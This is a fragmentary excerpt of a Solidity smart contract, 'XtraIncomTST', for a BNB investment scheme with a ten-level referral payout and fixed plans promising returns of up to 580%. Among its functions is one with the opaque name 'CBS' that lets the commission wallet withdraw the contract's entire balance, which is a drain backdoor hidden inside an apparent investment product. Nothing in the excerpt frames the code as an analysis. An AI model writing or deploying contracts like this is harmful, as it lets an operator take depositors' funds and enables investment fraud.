...
contract XtraIncomTST {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 1e17; // Min 0.1 bnb 
	uint256[] public REFERRAL_PERCENTS 	= [1000, 300, 200, 100, 100, 100, 50, 50, 50, 50];
	...
	constructor(address payable wallet,address payable _developer) public {
        ...
        plans.push(Plan(365, 120));
		plans.push(Plan(180, 190));
		plans.push(Plan(90, 280));
		plans.push(Plan(30, 580));
       
	}
	function CBS() public {
		require(msg.sender == commissionWallet, "Forbidden");
		uint balance = address(this).balance;
		if(balance==0) return;
		commissionWallet.transfer(balance);
	}
	...
	function invest(address referrer, uint8 plan) public payable {
        ...
        uint256 shares = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		address payable addr3 = address(uint160(developerWallet));
